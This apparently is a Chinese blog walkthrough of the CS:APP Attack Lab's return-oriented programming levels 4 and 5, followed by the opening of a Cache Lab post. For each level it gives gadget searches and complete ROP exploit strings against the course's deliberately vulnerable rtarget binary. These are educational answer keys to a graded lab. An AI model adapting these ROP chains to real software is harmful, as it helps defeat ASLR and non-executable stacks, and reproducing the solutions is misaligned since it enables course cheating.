<h2 id="Generating-Byte-Codes"><a href="#Generating-Byte-Codes" class="headerlink" title="Generating Byte Codes"></a><span id = "generate">Generating Byte Codes</span></h2><p>将<code>gcc</code>用作汇编器，将<code>objdump</code>用作反汇编器，可以方便地生成指令序列的字节码。例如，假设你编写的文件<code>example.s</code>包含以下汇编代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Example of hand-generated assembly code</span><br><span class="line">  pushq   $0xabcdef    # Push value onto stack</span><br><span class="line">  addq    $17,%rax     # Add 17 to %rax</span><br><span class="line">  movl    %eax,%edx    # Copy lower 32 bits to %edx</span><br></pre></td></tr></table></figure>
<p>此代码可以包含指令和数据的混合。“<code>＃</code>”字符右侧的任何内容均为注释。</p>
<p>你现在可以汇编和反汇编此文件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">unix&gt;</span><span class="bash"> gcc -c example.s</span></span><br><span class="line"><span class="meta">unix&gt;</span><span class="bash"> objdump -d example.o &gt; example.d</span></span><br></pre></td></tr></table></figure>
<p>生成的文件<code>example.d</code>包含以下内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">example.o: file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">  0: 68 ef cd ab 00    pushq  $0xabcdef</span><br><span class="line">  5: 48 83 c0 11       add    $0x11,%rax</span><br><span class="line">  9: 89 c2             mov    %eax,%edx</span><br></pre></td></tr></table></figure>
<p>底部几行显示了根据汇编语言指令生成的机器代码。 每行的左侧都有一个十六进制数字，表示该指令的起始地址（从0开始），而“<code>:</code>”字符后的十六进制数字表示该指令的<strong>字节码</strong>。 因此，我们可以看到指令<code>push $0xABCDEF</code>具有十六进制格式的字节码<code>68 ef cd ab 00</code>。</p>
<p>从此文件中，你可以获得代码的字节序列：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">68 ef cd ab 00 48 83 c0 11 89 c2</span><br></pre></td></tr></table></figure>
<p>然后，可以将该字符串通过<code>hex2raw</code>传递，以生成目标程序的输入字符串。或者，你可以编辑<code>example.d</code>以忽略无关的值，并包含C样式的注释以提高可读性，从而得到：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">68 ef cd ab 00   /* pushq  $0xabcdef  */</span><br><span class="line">48 83 c0 11      /* add    $0x11,%rax */</span><br><span class="line">89 c2            /* mov    %eax,%edx  */</span><br></pre></td></tr></table></figure>
<p>这也是在发送给目标程序之一之前可以通过<code>hex2raw</code>传递的有效输入。</p>
<p><a href="#generateq">点此返回</a></p>
<hr>
<p>若只完成课程要求部分，则此时可以结束阅读。</p>
<p>下面是课程要求外的部分。</p>
<hr>
<h1 id="Part-II-Return-Oriented-Programming"><a href="#Part-II-Return-Oriented-Programming" class="headerlink" title="Part II: Return-Oriented Programming"></a>Part II: Return-Oriented Programming</h1><blockquote>
<p>对<code>rtarget</code>进行代码注入攻击比对<code>ctarget</code>进行难度要大得多，因为它使用两种技术来阻止此类攻击：</p>
<ul>
<li>它使用<strong>随机化</strong>，以使堆栈位置在一个行程与另一个行程之间有所不同。 这使得无法确定注入的代码将位于何处。</li>
<li>它会将保存堆栈的内存部分标记为<strong>不可执行</strong>，因此，即使你可以将程序计数器设置为注入代码的开始，程序也会因<strong>段错误（segmentation fault）</strong>而失败。</li>
</ul>
<p>幸运的是，聪明的人已经设计了策略，可以通过<strong>执行现有代码而不是注入新代码</strong>来在程序中完成有用的事情。 这种方法的最一般形式称为<strong>面向返回编程（ROP）</strong>。 ROP的策略是<strong>在现有程序中标识由一个或多个指令以及指令<code>ret</code>组成的字节序列</strong>。 这样的段称为**<code>gadget</code>**。</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E8%AE%BE%E7%BD%AE%E8%A6%81%E6%89%A7%E8%A1%8C%E7%9A%84gadget%E5%BA%8F%E5%88%97.png" alt="设置要执行的gadget序列"></p>
<p>上图说明了如何设置堆栈以执行n个<code>gadget</code>序列。在此图中，堆栈包含一系列<code>gadget</code>地址。每个<code>gadget</code>均由一系列指令字节组成，最后一个为<code>0xc3</code>，用于编码<code>ret</code>指令。当程序从该配置开始执行<code>ret</code>指令时，它将启动一系列<code>gadget</code>执行，其中<code>ret</code>指令位于每个<code>gadget</code>的末尾，从而导致程序跳至下一个小程序的开头。</p>
<p><code>gadget</code>可以使用与编译器生成的汇编语句相对应的代码，尤其是在函数末尾的代码。在实践中，可能有一些有用的<code>gadget</code>，但不足以实现许多重要的操作。例如，编译后的函数极不可能在弹出之前将<code>popq ％rdi</code>作为其最后一条指令。幸运的是，对于面向字节的指令集（例如x86-64），通常可以通过从指令字节序列的其他部分提取模式来找到<code>gadget</code>。</p>
<p>例如，一个版本的<code>rtarget</code>包含为以下C函数生成的代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setval_210</span><span class="params">(<span class="keyword">unsigned</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  *p = <span class="number">3347663060U</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此功能对攻击系统有用的机会似乎很小。 但是，此功能的反汇编机器码显示了一个有趣的字节序列：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">0000000000400f15 &lt;setval_210&gt;:</span><br><span class="line">  400f15: c7 07 d4 48 89 c7    movl $0xc78948d4,(%rdi)</span><br><span class="line">  400f1b: c3    retq</span><br></pre></td></tr></table></figure>

<p>字节序列<code>48 89 c7</code>对指令<code>movq ％rax，％rdi</code>进行编码。 （有关有用的movq指令的编码，请参见下图。）</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/movq%E6%8C%87%E4%BB%A4%E7%9A%84%E7%BC%96%E7%A0%81.png" alt="movq指令的编码"></p>
<p>此序列后跟字节值<code>c3</code>，该字节值对<code>ret</code>指令进行编码。 该函数从地址<code>0x400f15</code>开始，序列从该函数的第四个字节开始。 因此，该代码包含一个起始地址为<code>0x400f18</code>的<code>gadget</code>，该<code>gadget</code>会将寄存器<code>％rax</code>中的64位值复制到寄存器<code>％rdi</code>。</p>
<p><code>rtarget</code>的代码在我们称为<code>gadget farm</code>的区域中包含许多与上面显示的<code>setval_210</code>函数相似的函数。 你的工作将是识别<code>gadget farm</code>中的有用<code>gadget</code>，并使用它们执行与<code>level 2</code>和<code>level 3</code>中类似的攻击。</p>
<p>重要提示：<code>gadget farm</code>在<code>rtarget</code>副本中由函数<code>start_farm</code>和<code>end_farm</code>划分。 请勿尝试从程序代码的其他部分构造<code>gadget</code>。</p>
</blockquote>
<p><code>level 4</code>和<code>level 5</code>分别对应着<code>level 2</code>和<code>level 3</code>，区别是此时将对<code>rtarget</code>进行攻击，而不再是<code>ctarget</code>。<code>rtarget</code>开启了地址随机化和栈不可执行机制，我们将不能注入新的代码，但是我们可以将现有的代码转化为新的代码，即<strong>ROP</strong>方法。</p>
<p>反汇编：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">objdump -d rtarget &gt; rtarget.s</span><br></pre></td></tr></table></figure>
<h2 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h2><blockquote>
<p>对于<code>level 4</code>，你将重复<code>level 2</code>的攻击，但是使用<code>gadget farm</code>中的<code>gadget</code>在<code>rtarget</code>上进行此操作。 你可以使用由以下指令类型组成的<code>gadget</code>并仅使用前八个x86-64寄存器（<code>％rax</code>–<code>％rdi</code>）来构建解决方案。<br><code>movq</code>：这些代码在下图A中显示。<br><code>popq</code>：这些代码在下图B中显示。</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E5%9B%BE3A-B.png" alt="图3A-B"></p>
<p><code>ret</code>：该指令由单字节<code>0xc3</code>编码。<br><code>nop</code>：该指令（发音为“ no op”，缩写为“ no operation”）由单字节<code>0x90</code>编码。 唯一的作用是使程序计数器加1。</p>
<p>一些忠告：</p>
<ul>
<li>你所需的所有<code>gadget</code>都可以在函数<code>start_farm</code>和<code>mid_farm</code>划定的<code>rtarget</code>的代码区域中找到。</li>
<li>你可以仅用两个<code>gadget</code>进行这种攻击。</li>
<li>当<code>gadget</code>使用<code>popq</code>指令时，它将从堆栈中弹出数据。 结果，你的漏洞利用字符串将包含<code>gadget</code>地址和数据的组合。</li>
</ul>
</blockquote>
<p>目的与<code>level 2</code>相同，即用字符串执行<code>touch2</code>函数，并使参数<code>val</code>等于<code>cookie</code>值。</p>
<p>由于不能注入我们自己编写的代码，我们需要从<code>rtarget.s</code>中的<code>&lt;start_farm&gt;</code>（401994）和<code>&lt;end_farm&gt;</code>（401ab2）之间寻求已有的代码作为替代。类似地，利用<code>getbuf</code>的缓冲区溢出漏洞，将找到替代的代码<strong>地址</strong>直接置于40字节之后。</p>
<p>回忆我们在<code>level 2</code>中编写的代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov    $0x59b997fa,%rdi    # cookie</span><br><span class="line">push   $0x4017ec           # touch2</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>思路是先将<code>cookie</code>值传入<code>%rdi</code>，再跳转到<code>touch2</code>地址即可。</p>
<hr>
<p>现在不可以直接将一个特定立即数传给某寄存器，所以先将此立即数保存在栈中，再<code>pop</code>到指定寄存器。</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E5%9B%BE3B.png" alt="图3B"></p>
<p>观察上图，并寻找含有<code>58</code>～<code>5f</code>的语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  4019ad:	c3                   	retq</span><br></pre></td></tr></table></figure>
<p>此处的<code>58 90 c3</code>对应：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">popq    %rax</span><br><span class="line">nop</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>我们找到了可以<code>pop</code>到<code>%rax</code>寄存器的指令，地址为<code>4019a7+4=4019ab</code>。</p>
<hr>
<p>然后我们寻找可以实现<code>%rax</code>-&gt;…-&gt;<code>%rdi</code>的指令。</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E5%9B%BE3A.png" alt="图3A"></p>
<p>观察上图，如果有<code>48 89 c7</code>最好，如果没有则需要多传递几次。寻找结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:	c3                   	retq  </span><br></pre></td></tr></table></figure>
<p>此处的<code>48 89 c7 c3</code>对应：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">movq    %rax,%rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>地址为<code>4019a0+2=4019a2</code>。</p>
<hr>
<p>将得到的各个<code>gadget</code>进行总结：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">popq    %rax      # 4019ab</span><br><span class="line">                  # cookie</span><br><span class="line">movq    %rax,%rdi # 4019a2</span><br><span class="line">                  # address of touch2</span><br></pre></td></tr></table></figure>
<p>其中<code>cookie</code>为<code>59b997fa</code>，<code>touch2</code>的地址为<code>4017ec</code>。</p>
<hr>
<p>编辑用于攻击的字符串文件<code>exploit.txt</code>（<strong>注意注释周围的空格</strong>）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00 /* popq    %rax */</span><br><span class="line">fa 97 b9 59 00 00 00 00 /* cookie */</span><br><span class="line">a2 19 40 00 00 00 00 00 /* movq    %rax,%rdi */</span><br><span class="line">ec 17 40 00 00 00 00 00 /* address of touch2 */</span><br></pre></td></tr></table></figure>
<p>再将保存的<code>exploit.txt</code>输入到<code>rtarget</code>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat exploit.txt | ./hex2raw | ./rtarget -q</span><br></pre></td></tr></table></figure>
<p>得到输出如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution for level 2 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
<p>完成。</p>
<h2 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h2><blockquote>
<p>在进行<code>level 5</code>之前，请暂停思考你到目前为止已完成的工作。在<code>level 2</code>和<code>level 3</code>中，你使程序执行自己设计的机器代码。如果<code>ctarget</code>曾经是网络服务器，则可以将自己的代码注入到远程计算机中。在<code>level 4</code>中，你规避了现代系统用来阻止缓冲区溢出攻击的两个主要设备。尽管你没有注入自己的代码，但是你仍然可以注入一种程序，该程序通过将现有代码序列拼接在一起来运行。你还为此实验获得了95/100分。这是一个很好的成绩。如果你还有其他紧迫的任务，请考虑立即停止。</p>
<p><code>level 5</code>要求你对<code>rtarget</code>进行ROP攻击，以使用指向<code>cookie</code>字符串表示形式的指针来调用函数<code>touch3</code>。除了使用ROP攻击来调用<code>touch2</code>之外，这似乎似乎没有那么困难。此外，第5阶段仅计5分，这并不是衡量其所需努力的真实指标。对于那些想要超越课程正常期望的人，将其视为额外的学分问题。</p>
<p>要解决<code>level 5</code>，可以在函数<code>rstart_farm</code>和<code>end_farm</code>划分的<code>rtarget</code>中的代码区域中使用<code>gadget</code>。 除了在<code>levle 4</code>中使用的<code>gadget</code>之外，此扩展服务器场还包括不同<code>movl</code>指令的编码，如下图C所示。 服务器场此部分中的字节序列还包含2字节指令，这些指令用作功能上的<code>nop</code>，即它们不更改任何寄存器或内存值。这些指令包括下图D中所示的指令，例如<code>andb ％al，％al</code>，它们在某些寄存器的低位字节上运行，但不更改其值。</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E5%9B%BE3C-D.png" alt="图3C-D"></p>
<p>一些忠告：</p>
<ul>
<li>你需要查看<code>movl</code>指令对寄存器的高4位字节的影响。</li>
<li>官方解决方案需要八个<code>gadget</code>（并非全部都是唯一的）。</li>
</ul>
<p>Good luck and have fun!</p>
</blockquote>
<p>目的与<code>level 3</code>相同，即传参为<code>cookie</code>值对应的字符串，区别是此时需要进行ROP攻击。</p>
<p>回忆我们在<code>level 3</code>中编写的代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov    $0x5561dca8,%rdi    # string</span><br><span class="line">push   $0x4018fa           # touch3</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>思路是先将<code>cookie</code>字符串的地址传入<code>%rdi</code>，再跳转到<code>touch3</code>地址即可。</p>
<hr>
<p>但此时栈地址是随机化的，导致我们无法直接获取字符串的地址。根据<code>level 4</code>的经验，我们需要从<code>gadget farm</code>中找到一个能将<code>%rsp</code>传出来的<code>gadget</code>。</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E5%9B%BE3A.png" alt="图3A"></p>
<p>观察上图，并寻找含有<code>48 89 e0</code>～<code>48 89 e7</code>的语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000401a03 &lt;addval_190&gt;:</span><br><span class="line">  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax</span><br><span class="line">  401a09:	c3                   	retq  </span><br></pre></td></tr></table></figure>
<p>此处的<code>48 89 e0 c3</code>对应：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">movq    %rsp,%rax</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>地址为<code>401a03+3=401a06</code>。</p>
<hr>
<p>现在找到了一个<code>gadget</code>取出<code>%rsp</code>的值到<code>%rax</code>，但是还需要加上偏移量才是真正的字符串的地址，最终还需要把这两部分相加（起始地址+偏移量）赋给<code>%rdi</code>。</p>
<p>观察<code>gadget farm</code>可以发现，有一个与众不同的<code>gadget</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000004019d6 &lt;add_xy&gt;:</span><br><span class="line">  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  4019da:	c3                   	retq  </span><br></pre></td></tr></table></figure>
<p>它正可以实现将<code>%rdi</code>和<code>%rsi</code>两个寄存器的值相加赋给<code>%rax</code>，地址为<code>4019d6</code>。</p>
<hr>
<p>发现这个<code>gadget</code>后，我们的思路更加清晰了：</p>
<ul>
<li>方案一：<ul>
<li>首先利用<code>level 4</code>的方法，将偏移量弹出至<code>%rax</code>，再用<code>4019a2</code>将<code>%rax</code>赋给<code>%rdi</code>；</li>
<li>其次用<code>401a06</code>将<code>%rsp</code>（起始地址）赋给<code>%rax</code>，再将<code>%rax</code>赋给<code>%rsi</code>（可能多次）；</li>
<li>最后用<code>4019d6</code>将<code>%rdi</code>和<code>%rsi</code>相加赋给<code>%rax</code>，再用<code>4019a2</code>将<code>%rax</code>赋给<code>%rdi</code>。</li>
</ul>
</li>
<li>方案二：<ul>
<li>首先利用<code>level 4</code>的方法，将偏移量弹出至<code>%rax</code>，再将<code>%rax</code>赋给<code>%rsi</code>（可能多次）；</li>
<li>其次用<code>401a06</code>将<code>%rsp</code>（起始地址）赋给<code>%rax</code>，再用<code>4019a2</code>将<code>%rax</code>赋给<code>%rdi</code>；</li>
<li>最后用<code>4019d6</code>将<code>%rdi</code>和<code>%rsi</code>相加赋给<code>%rax</code>，再用<code>4019a2</code>将<code>%rax</code>赋给<code>%rdi</code>。</li>
</ul>
</li>
</ul>
<p>总之，现在需要一种（或多种组合）将<code>%rax</code>赋给<code>%rsi</code>的<code>gadget</code>。</p>
<hr>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E5%9B%BE3A.png" alt="图3A"></p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E5%9B%BE3C.png" alt="图3C"></p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E5%9B%BE3D.png" alt="图3D"></p>
<p>观察以上三图，寻找含有<code>89 c6</code>（<code>%eax</code>-&gt;<code>%esi</code>）的语句，遗憾的是并没有。</p>
<p>再寻找含有<code>89 c0</code>～<code>89 c7</code>（<code>%eax</code>-&gt;）的语句：</p>
<ul>
<li><p>已知的<code>4019a2</code>可以将<code>%rax</code>赋给<code>%rdi</code>；</p>
<ul>
<li>再寻找含有<code>89 f8</code>～<code>89 ff</code>（<code>%edi</code>-&gt;）的语句，遗憾的是并没有。</li>
</ul>
</li>
<li><p><code>getval_481</code>：（<code>%eax</code>-&gt;<code>%edx</code>）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000004019db &lt;getval_481&gt;:</span><br><span class="line">  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax</span><br><span class="line">  4019e0:	c3                   	retq </span><br></pre></td></tr></table></figure>
<p>此处的<code>89 c2 90 c3</code>对应：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">movl    %eax,%edx</span><br><span class="line">nop</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>地址为<code>4019db+2=4019dd</code>。</p>
<ul>
<li><p>再寻找含有<code>89 d0</code>～<code>89 d7</code>（<code>%edx</code>-&gt;）的语句：</p>
<p><code>getval_159</code>：（<code>%edx</code>-&gt;<code>%ecx</code>）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000401a33 &lt;getval_159&gt;:</span><br><span class="line">  401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax</span><br><span class="line">  401a38:	c3                   	retq </span><br></pre></td></tr></table></figure>
<p>此处的<code>89 d1 38 c9 c3</code>对应：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">movl    %edx,%ecx</span><br><span class="line">cmpb    %cl,%cl</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>（<code>38 c9</code>可以忽略）地址为<code>401a33+1=401a34</code>。</p>
<ul>
<li><p>再寻找含有<code>89 c8</code>～<code>89 cf</code>（<code>%ecx</code>-&gt;）的语句：</p>
<p><code>addval_436</code>：（<code>%ecx</code>-&gt;<code>%esi</code>）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000401a11 &lt;addval_436&gt;:</span><br><span class="line">  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax</span><br><span class="line">  401a17:	c3                   	retq </span><br></pre></td></tr></table></figure>
<p>此处的<code>89 ce 90 90 c3</code>对应：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">movl    %ecx,%esi</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>地址为<code>401a11+2=401a13</code>。</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>综上，找到了<code>%eax</code>-&gt;<code>4019dd</code>-&gt;<code>%edx</code>-&gt;<code>401a34</code>-&gt;<code>%ecx</code>-&gt;<code>401a13</code>-&gt;<code>%esi</code>。</p>
<hr>
<p>将得到的各个<code>gadget</code>进行总结：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">popq    %rax              # 4019ab</span><br><span class="line">                          # offset</span><br><span class="line">movl    %eax,%edx         # 4019dd</span><br><span class="line">movl    %edx,%ecx         # 401a34</span><br><span class="line">movl    %ecx,%esi         # 401a13</span><br><span class="line">movq    %rsp,%rax         # 401a06</span><br><span class="line">movq    %rax,%rdi         # 4019a2</span><br><span class="line">lea    (%rdi,%rsi,1),%rax # 4019d6</span><br><span class="line">movq    %rax,%rdi         # 4019a2</span><br><span class="line">                          # address of touch3</span><br><span class="line">                          # string of cookie</span><br></pre></td></tr></table></figure>
<p>其中偏移量从<code>%rsp</code>读入开始计算，为<code>4*8=32=0x20</code>，<code>touch3</code>的地址为<code>4018fa</code>，<code>cookie</code>值对应的字符串的十六进制表示为<code>35 39 62 39 39 37 66 61 00</code>。</p>
<hr>
<p>编辑用于攻击的字符串文件<code>exploit.txt</code>（<strong>注意注释周围的空格</strong>）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00 /* popq    %rax */</span><br><span class="line">20 00 00 00 00 00 00 00 /* offset */</span><br><span class="line">dd 19 40 00 00 00 00 00 /* movl    %eax,%edx */</span><br><span class="line">34 1a 40 00 00 00 00 00 /* movl    %edx,%ecx */</span><br><span class="line">13 1a 40 00 00 00 00 00 /* movl    %ecx,%esi */</span><br><span class="line">06 1a 40 00 00 00 00 00 /* movq    %rsp,%rax */</span><br><span class="line">a2 19 40 00 00 00 00 00 /* movq    %rax,%rdi */</span><br><span class="line">d6 19 40 00 00 00 00 00 /* lea    (%rdi,%rsi,1),%rax */</span><br><span class="line">a2 19 40 00 00 00 00 00 /* movq    %rax,%rdi */</span><br><span class="line">fa 18 40 00 00 00 00 00 /* address of touch3 */</span><br><span class="line">35 39 62 39 39 37 66 61 00 /* string of cookie */</span><br></pre></td></tr></table></figure>
<p>再将保存的<code>exploit.txt</code>输入到<code>rtarget</code>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat exploit.txt | ./hex2raw | ./rtarget -q</span><br></pre></td></tr></table></figure>
<p>得到输出如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch3!: You called touch3(&quot;59b997fa&quot;)</span><br><span class="line">Valid solution for level 3 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 20 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure>
<p>完成。</p>
]]></content>
      <tags>
        <tag>Computer Systems</tag>
        <tag>Lab Assignments</tag>
      </tags>
  </entry>
  <entry>
    <title>缓存影响了什么？</title>
    <url>/Cache-Lab/</url>
    <content><![CDATA[<p>CS:APP–Lab assignments #7 - Cache Lab: Understanding Cache Memories</p>
<a id="more"></a>

<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ExiTalk.png"></p>
<p><strong><em>若参考或转载请注明出处</em></strong></p>
<p>本实验将帮助你了解缓存对C程序性能的影响。</p>
<p>实验由两部分组成：</p>
<ul>
<li>在第一部分中，你将编写一个小的C程序（大约200～300行），该程序模拟高速缓存的行为；</li>
<li>在第二部分中，你将优化一个小型矩阵转置函数，其目标是最大程度地减少高速缓存未命中的次数。</li>
</ul>
<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><h2 id="Files-of-the-Assignment"><a href="#Files-of-the-Assignment" class="headerlink" title="Files of the Assignment"></a>Files of the Assignment</h2><p>你必须在64位x86-64计算机上运行此实验。</p>
<p>首先将<code>cachelab-handout.tar</code>复制到Linux目录中，然后发出命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">linux&gt;</span><span class="bash"> tar xvf cachelab-handout.tar</span></span><br></pre></td></tr></table></figure>
<p>这将创建一个名为<code>cachelab-handout</code>的目录，其中包含许多文件。你将要修改两个文件：<code>csim.c</code>和<code>trans.c</code>。要编译这些文件，请键入：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">linux&gt;</span><span class="bash"> make clean</span></span><br><span class="line"><span class="meta">linux&gt;</span><span class="bash"> make</span></span><br></pre></td></tr></table></figure>
<p><strong>警告</strong>：不要让Windows WinZip程序打开你的<code>.tar</code>文件（许多Web浏览器设置为自动执行此操作），而应该将文件保存到Linux目录，然后使用Linux tar程序提取文件。通常，对于此类文件，你永远不要使用Linux以外的任何平台来修改文件。这样做可能会导致数据丢失（包括你所做的重要的工作！）。</p>
<h2 id="Reference-Trace-Files"><a href="#Reference-Trace-Files" class="headerlink" title="Reference Trace Files"></a>Reference Trace Files</h2><p>首先安装<code>valgrind</code>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install valgrind</span><br></pre></td></tr></table></figure>
<p>查看版本号以检测是否安装成功：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">valgrind --version</span><br></pre></td></tr></table></figure>
<p>实验文件目录的<code>traces</code>子目录包含参考跟踪文件的集合，我们将使用它们来评估你在Part A中编写的缓存模拟器的正确性。跟踪文件由名为<code>valgrind</code>的Linux程序生成。例如，在命令行中输入</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">linux&gt;</span><span class="bash"> valgrind --log-fd=1 --tool=lackey -v --trace-mem=yes ls -l</span></span><br></pre></td></tr></table></figure>
<p>运行可执行程序“<code>ls -l</code>”，按照它们发生的顺序捕获对其每个内存访问的跟踪，并在标准输出上打印它们。<code>Valgrind</code>内存跟踪具有以下形式：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">I 0400d7d4,8</span><br><span class="line"> M 0421c7f0,4</span><br><span class="line"> L 04f6b868,8</span><br><span class="line"> S 7ff0005c8,8</span><br></pre></td></tr></table></figure>
<p>每行表示一个或两个内存访问。每行的格式是</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[space]operation address,size</span><br></pre></td></tr></table></figure>
<p>其中：</p>
<ol>
<li><p><code>operation</code>字段表示内存访问的类型：</p>
<ul>
<li>“<code>I</code>”表示指令加载，</li>
<li>“<code>L</code>”表示数据加载，</li>
<li>“<code>S</code>”表示数据存储，</li>
<li>“<code>M</code>”表示数据修改（即数据加载+数据存储）。</li>
</ul>
<p>每个“<code>I</code>”之前都没有空格。每个“<code>M</code>”、“<code>L</code>”和“<code>S</code>”之前总是有一个空格。</p>
</li>
<li><p><code>address</code>字段指定64位十六进制内存地址。</p>
</li>
<li><p><code> size</code>字段指定操作访问的字节数。</p>
</li>
</ol>
